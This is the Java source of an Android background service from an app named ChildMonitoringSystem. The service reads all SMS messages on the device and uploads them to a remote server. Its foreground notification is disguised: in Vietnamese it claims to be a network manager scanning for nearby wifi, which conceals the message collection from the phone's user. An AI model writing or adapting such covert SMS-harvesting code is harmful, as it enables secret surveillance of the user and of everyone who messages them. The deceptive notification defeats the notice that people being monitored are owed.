package com.ChildMonitoringSystem.CMS.JobService;

import static com.ChildMonitoringSystem.CMS.MyApplication.CHANNEL_ID;

import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import com.ChildMonitoringSystem.CMS.BroadCast.Restarter_Service;
import com.ChildMonitoringSystem.CMS.GetDataFromDevice.LoadContactFromDevice;
import com.ChildMonitoringSystem.CMS.GetDataFromDevice.LoadMessageFromDevice;
import com.ChildMonitoringSystem.CMS.Model.INFO_MESSAGE;
import com.ChildMonitoringSystem.CMS.Model.INFO_PHONEBOOK;
import com.ChildMonitoringSystem.CMS.R;
import com.ChildMonitoringSystem.CMS.Value.Constant;

import java.util.ArrayList;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class UploadMessDataService extends Service {
    private ArrayList<INFO_MESSAGE> list;

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT > Build.VERSION_CODES.O)
            startMyOwnForeground();
        else
            startForeground(1, new Notification());
        try {
            LoadMessageFromDevice loadMessageFromDevice = new LoadMessageFromDevice();
            list = loadMessageFromDevice.Load_SMS(getApplicationContext());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    @RequiresApi(Build.VERSION_CODES.O)
    private void startMyOwnForeground() {
        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, CHANNEL_ID);
        Notification notification = notificationBuilder.setOngoing(true)
                .setContentTitle("Trình quản lí mạng")
                .setContentText("Hệ thống đang quét wifi gần bạn")
                .setSmallIcon(R.drawable.ic_baseline_settings_24)
                .setShowWhen(false)
                .build();
        startForeground(2, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        Log.i("TAG", "Upload data");
        SendMesstoServer(list);
        return START_NOT_STICKY;
    }

    private void SendMesstoServer(ArrayList<INFO_MESSAGE> info_messages) {
        if (info_messages.size() > 0) {
            com.ChildMonitoringSystem.CMS.Service.Service.apiservice.sendMessage(info_messages).enqueue(new Callback<ArrayList<INFO_MESSAGE>>() {
                @Override
                public void onResponse(Call<ArrayList<INFO_MESSAGE>> call, Response<ArrayList<INFO_MESSAGE>> response) {
                    Log.i("TAG", "onResponse: send done");
                    stopSelf();
                }

                @Override
                public void onFailure(Call<ArrayList<INFO_MESSAGE>> call, Throwable t) {
                    Log.i("TAG", "onResponse: send failed");
                }
            });


        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
